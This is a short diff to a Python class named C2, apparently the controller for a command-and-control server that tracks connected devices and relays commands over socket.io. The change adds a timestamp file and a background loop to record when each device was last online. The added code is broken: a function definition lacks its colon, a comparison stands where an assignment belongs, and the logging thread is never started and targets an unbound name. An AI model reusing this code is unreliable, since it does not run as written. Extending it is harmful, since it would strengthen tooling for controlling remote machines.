@@ -22,8 +22,15 @@ class C2:
         with open("clients.json", "r") as f:
             self.total_devices = json.load(f)
             f.close()
+        with open("current_time.txt", "r") as f:
+            self.last_time = f.read()
+            f.close()
         for device in self.total_devices:
             self.total_devices[device]["status"] = "Offline"
+            if (self.total_devices[device]["last_online"] == "now"):
+                self.total_devices[device]["last_online"] == self.last_time
+
+        threading.Thread(target=log_time, daemon=True)
         self.sio.on("mConnect", self.on_connect)
         self.sio.on("disconnect", self.on_disconect)
         self.sio.on("command", self.send_command)
@@ -126,6 +133,14 @@ class C2:
                 self.total_devices.update({data["uid"]: data})
                 self.update_json()
                 break
+
+    def log_time(self)
+        while True:
+            with open("current_time.txt", "w") as file:
+                current_time = time.strftime("%Y-%m-%d-%H-%M-%S")
+                file.write(current_time)
+                file.close()
+            time.sleep(1)
 
     def list_devices(self):
         return self.devices
